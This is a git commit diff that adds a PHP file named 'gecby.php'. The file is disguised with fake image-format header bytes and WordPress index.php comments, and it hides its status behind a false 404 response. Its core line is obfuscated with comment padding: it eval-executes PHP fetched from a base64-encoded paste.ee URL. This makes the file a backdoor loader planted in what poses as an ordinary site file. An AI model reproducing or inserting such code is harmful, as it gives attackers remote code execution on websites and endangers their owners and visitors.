07ee3039bd18254632658877ccb70ede93e39c1c
TN.RIJ4L <59259192+rijal-cpu@users.noreply.github.com>
2025-04-16 14:32:05 +0800

    Create gecby.php

---
+++ gecby.php
@@ -0,0 +1,30 @@
+‰PNG
+
+IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
+ÿØÿà JFIF  ` `  ÿþš
+<!-- GIF89;a -->
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+@set_time_limit(0);
+@error_reporting(0);
+@header('HTTP/1.1 404 Not Found', true, 404);
+ob_start();
+ini_set('display_errors', 0);
+ini_set('log_errors', 1);
+ini_set('error_log', '/path/to/your/error_log');
+ob_end_flush();
+?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(base64_decode/*******/("aHR0cHM6Ly9wYXN0ZS5lZS9yL1NaZEdRYktF")));/**/?>
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
